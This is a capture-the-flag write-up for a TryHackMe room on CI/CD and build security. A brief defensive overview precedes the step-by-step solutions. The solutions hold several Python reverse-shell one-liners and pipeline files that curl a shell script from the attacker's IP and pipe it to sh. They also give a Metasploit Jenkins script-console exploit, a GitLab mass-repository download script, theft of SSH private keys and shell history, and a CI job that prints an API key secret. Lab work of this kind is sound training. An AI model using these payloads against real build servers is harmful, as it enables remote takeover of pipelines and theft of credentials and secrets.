# 🤖 **CI/CD** and Build Security

* Solving [CI/CD and Build Security](https://tryhackme.com/room/cicdandbuildsecurity)

## 📌 Introduction
Creating a secure build environment is essential to protect the software development lifecycle from threats and vulnerabilities. The **SolarWinds supply chain attack** serves as a cautionary example, underlining the importance of robust security in every phase of CI/CD.

## 🔧 Fundamentals of CI/CD (GitLab's 8 Principles)
1. **Single Source Repository** - Centralized codebase.
2. **Frequent Check-ins** - Smaller, frequent updates.
3. **Automated Builds** - Builds triggered on code updates.
4. **Self-testing Builds** - Automatic testing for quality and security.
5. **Frequent Iterations** - Reduces merge conflicts.
6. **Stable Testing Environments** - Simulate production-like conditions.
7. **Maximum Visibility** - Transparent and accessible development.
8. **Predictable Deployments** - Low-risk, consistent release process.

## 🔄 A Typical CI/CD Pipeline

**Components:**
- 🧑‍💻 **Developer Workstations** – Code creation (e.g., AttackBox)
- 📁 **Source Code Repositories** – Version control (e.g., GitLab)
- 📦 **Build Orchestrators** – Automation tools (e.g., GitLab CI, Jenkins)
- 🤖 **Build Agents** – Execute build tasks (e.g., GitLab Runners)
- 🧪 **Environments** – DEV, STAGE, PROD stages

## 🛡️ The SolarWinds Case Study
- In 2020, attackers **injected SUNBURST malware** into SolarWinds' **Orion** software via the build system.
- Resulted in **widespread compromise** of both government and private networks.
- Showed how a **single vulnerable vendor** can impact many organizations.

## 🔐 Key Security Measures

### 🔒 Isolation & Segmentation
- **Segment build stages** to contain breaches.
- Use **containerization or virtualization** for process isolation.
- Restrict interaction between components.

### 👤 Access Controls & Permissions
- Apply **Least Privilege Principle**.
- Use **Multi-Factor Authentication (MFA)**.
- Regularly **review access privileges**.
- Strictly control **administrative access** and audit activity.

### 🌐 Network Security
- Segment networks into **security zones**.
- Secure software update channels.
- Validate **third-party dependencies**.
- Monitor supplier security posture regularly.

## Challenge Solutions

### Setup

1. IPs to subomains
    ```sh
    sudo echo 10.200.59.150 gitlab.tryhackme.loc >> /etc/hosts
    sudo echo 10.200.59.160 jenkins.tryhackme.loc >> /etc/hosts
    ```

2. Get User:Password from `MUTHER` server
    ```sh
    ssh mother@10.200.59.250
    Password: motherknowsbest

    ## Not Important for the Class
    ```

### Create Pipeline on `GITLAB`

1. Create User
    ```
    U:   cicdman
    P:   Abc123!@#CiCd
    E-M: cicdman@gitlab.com
    ```

2. Log in
3. Search for `Basic`
4. Found: `http://gitlab.tryhackme.loc/ash/basic-build`
5. Fork it!

#### 👀 Eyes on `.gitlab-ci.yml`

* This file contains **the steps** that will be **performed automatically** when a **new commit is made** to the repo

### Create Runner on Local Machine

1. Settings
2. CI/CD
3. Expand Runners
4. Push `New Runner`
5. Check `UnTagged Run`
6. Generate Runner Script
7. install gitlab runner on local machine
    ```sh
    sudo apt install gitlab-runner
    ```
8. Copy Generated Script on Level 6 and execute it, Executor is `shell`
9. Make a commit and it will run automatically
10. check: `127.0.0.1:8081`
11. Check `README.md` for **username** and **password**, it is: `admin:admin`

---

### Enumeration

1. Install Dependencies
    ```sh
    pip3 install python-gitlab==3.15.0
    ```
2. Make Access Token with user already created
3. Replace in code below
  ```python
  import gitlab
  import uuid

  # Create a Gitlab connection
  gl = gitlab.Gitlab("http://gitlab.tryhackme.loc/", private_token='REPLACE_ME')
  gl.auth()

  # Get all Gitlab projects
  projects = gl.projects.list(all=True)

  # Enumerate through all projects and try to download a copy
  for project in projects:
      print ("Downloading project: " + str(project.name))
      #Generate a UID to attach to the project, to allow us to download all versions of projects with the same name
      UID = str(uuid.uuid4())
      print (UID)
      try:
          repo_download = project.repository_archive(format='zip')
          with open (str(project.name) + "_" + str(UID) +  ".zip", 'wb') as output_file:
              output_file.write(repo_download)
      except Exception as e:
          # Based on permissions, we may not be able to download the project
          print ("Error with this download")
          print (e)
          pass
  ```
4. Run and Get **ZIP Directories**
5. **Extract** and Look For **Flags**

### Build Proccess

1. `ip a` get `cicd` local ip! (**THM Stuff**) 😉
2. Fork (http://gitlab.tryhackme.loc/ash/Merge-Test)
3. Create `shell.sh` file
    ```sh
    /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.44.89",9191)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    ```
4. Run on local: `python3 -m http.server 9090`
5. Run on local: `nc -lnvp 9191`
6. Edit `jenkinsfile`
```
pipeline {
    agent any
    stages {
        stage('build') {
            steps {
                sh '''
                    curl http://10.50.44.89:9090/shell.sh | sh
                '''                 
            }             
        }
    }       
}
```
7. Send Merge Request

---

### Securing Build Server

1. run `msfconsole -q`
2. use exploit: `exploit/multi/http/jenkins_script_console`
3. Username: `jenkins`
4. Password: `jenkins`
5. RHOSTS: `jenkins.tryhackme.loc`
6. RPORT: `8080`
7. TARGETURI: `/`
8. TARGET: `1`
9. PAYLOAD: `linux/x64/meterpreter/bind_tcp`
10. **run**

---

### Securing the Build Pipeline

1. login to **Gitlab**: `anatacker`:`Password1@`
2. Goto: `http://gitlab.tryhackme.loc/ash/approval-test`
3. Create `shell2.sh` file
    ```sh
    /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.44.89",9292)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    ```
4. (if not working) Run on local: `python3 -m http.server 9090`
5. Run on local: `nc -lnvp 9292`
6. Edit `.gitlab-ci.yaml`
```yaml
   stages:
     - deploy

   production:
     stage: deploy
     script:
       - 'curl http://10.50.44.89:9090/shell2.sh | sh'
     environment:
       name: ${CI_JOB_NAME}

```
7. **Commit** and **Merge**!

### Secure Build Environment

1. login to **Gitlab**: `anatacker`:`Password1@`
2. Goto: `http://gitlab.tryhackme.loc/ash/environments/`
3. Create `shell3.sh` file
    ```sh
    /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.50.44.89",9393)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
    ```
4. (if not working) Run on local: `python3 -m http.server 9090`
5. Run on local: `rlwrap nc -lnvp 9393`
6. Edit `.gitlab-ci.yaml`
```yaml
stages:
  - test
  - deploy

test:
  stage: test
  script:
    - 'curl http://10.50.44.89:9090/shell3.sh | sh'

production:
  stage: deploy
  when: manual
  script:
    - 'echo "Deploying to ${CI_ENVIRONMENT_NAME}"'
    - 'echo "${API_KEY}" > /tmp/key'
    - 'echo "Ready to use the API KEY"'
  environment:
    name: ${CI_JOB_NAME}

```
7. **Commit** and **Merge**!
8. Go to `.ssh` directory, access **SSH Private Keys**
9. Check History: `cat ~/.bash_history` 😉
10. for better shell, run:
    ```sh
    python3 -c 'import pty; pty.spawn("/bin/bash")';
    ```
11. Login with ssh key on both systems
    ```sh
    ssh -i ~/.ssh/id_rsa ubuntu@10.200.59.220
    ssh -i ~/.ssh/id_rsa ubuntu@10.200.59.230
    ```

### Build Secrets

1. login to **Gitlab**: `anatacker`:`Password1@`
2. Goto: `http://gitlab.tryhackme.loc/ash/environments/`
3. Change to `DEV` Branch
4. Edit `.gitlan-ci.yaml`
```yaml
stages:
  - test
  - deploy

test:
  stage: test
  script:
    - 'echo "${API_KEY}"'

production:
  stage: deploy
  when: manual
  script:
    - 'echo "${API_KEY}"'
  environment:
    name: ${CI_JOB_NAME}

```
7. **Commit** and **Merge**!
